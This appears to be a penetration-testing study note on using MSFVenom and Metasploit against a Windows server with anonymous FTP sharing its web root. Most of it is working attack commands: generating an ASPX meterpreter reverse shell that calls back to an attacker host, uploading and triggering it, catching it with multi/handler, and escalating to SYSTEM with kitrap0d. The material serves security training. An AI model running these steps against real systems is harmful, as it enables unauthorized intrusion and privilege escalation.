# MSFVenom and Metasploit Post-Exploitation

## MSFVenom Overview

**MSFVenom** is a combination of the legacy tools `MSFPayload` and `MSFEncode`. It is used to generate shellcode for specific processor architectures and operating systems while providing encoding schemes to remove **bad characters** and attempt evasion of security software.

While encoding was historically used for **Anti-Virus (AV)** evasion, modern security solutions using heuristic analysis and machine learning make simple encoding less effective for bypassing high-quality AV. Its primary modern utility is crafting "clean" shellcode that avoids runtime errors caused by prohibited characters.

---

## Scenario: Web-Linked FTP Exploitation

**Context:** This technique is used when an open FTP service (e.g., Anonymous login) shares a root directory with a web service (e.g., port 80), and the web service allows the execution of uploaded scripts.

### Vulnerable Configurations

|Setting|Impact|
|:--|:--|
|**Anonymous FTP Login**|Allows any user to upload files without credentials.|
|**No File Type Validation**|Allows the execution of malicious scripts (e.g., PHP, ASPX) via the web interface.|
|**Weak Service Permissions**|Initial shells often land as low-privilege users (e.g., `IIS APPPOOL\Web`), requiring privilege escalation.|

---

## Operational Workflow

### 1. Enumeration and Identification

Analyze the target to determine the appropriate payload format.

1. **Scan services:** Identify open FTP and Web ports.
    
    ```
    nmap -sV -T4 -p- <TARGET_IP>
    ```
    
2. **Test FTP Access:** Check for anonymous login and directory contents.
    
    ```
    ftp <TARGET_IP>
    ```
    
3. **Identify Web Framework:** Presence of folders like `aspnet_client` indicates the server can execute **.aspx** shells.

### 2. Payload Generation and Delivery

Generate a payload tailored to the target's architecture and upload it via the identified vector.

1. **Generate Payload:** Use MSFVenom to create a reverse shell file.
    
    ```
    msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ATTACK_IP> LPORT=<PORT> -f aspx > reverse_shell.aspx
    ```
    
2. **Upload via FTP:** Transfer the payload to the web root.
    
    ```
    ftp> put reverse_shell.aspx
    ```
    

### 3. Establishing the Listener

Set up a handler to catch the reverse connection before triggering the payload.

1. **Configure Multi/Handler:**
    
    ```
    msfconsole -q
    use multi/handler
    set LHOST <ATTACK_IP>
    set LPORT <PORT>
    run
    ```
    
2. **Trigger Payload:** Navigate to the file URL in a browser to execute the code.
    - **URL:** `http://<TARGET_IP>/reverse_shell.aspx`
    - **Note:** The page may appear blank, but the payload executes in the background.

### 4. Post-Exploitation and Privilege Escalation

Once a session is established, determine the user context and identify escalation paths.

1. **Verify Context:** Check current user and system architecture.
    
    ```
    getuid
    sysinfo
    ```
    
2. **Run Local Exploit Suggester:** Use this module when the current session has low permissions.
    
    ```
    use post/multi/recon/local_exploit_suggester
    set SESSION <SESSION_ID>
    run
    ```
    
3. **Execute Escalation Exploit:** Select a suggested exploit (e.g., `kitrap0d`) to gain **SYSTEM** privileges.
    
    ```
    use exploit/windows/local/ms10_015_kitrap0d
    set SESSION <SESSION_ID>
    set LPORT <NEW_PORT>
    run
    ```
    

---

## Command Reference

### MSFVenom Parameters

|Parameter|Description|
|:--|:--|
|`-p`|Specifics the payload (e.g., `windows/meterpreter/reverse_tcp`)|
|`LHOST`|The IP address of the attack machine|
|`LPORT`|The port the attack machine is listening on|
|`-f`|The output format (e.g., `aspx`, `php`, `exe`)|

### Troubleshooting

- **Session Instability:** If a Meterpreter session dies frequently, apply **encoding** to the payload to improve runtime stability.
- **Exploit Failure:** Not all "vulnerable" suggestions from the Local Exploit Suggester are 100% accurate due to environmental variables (e.g., user not being in the Administrators group). If one fails, proceed to the next suggestion.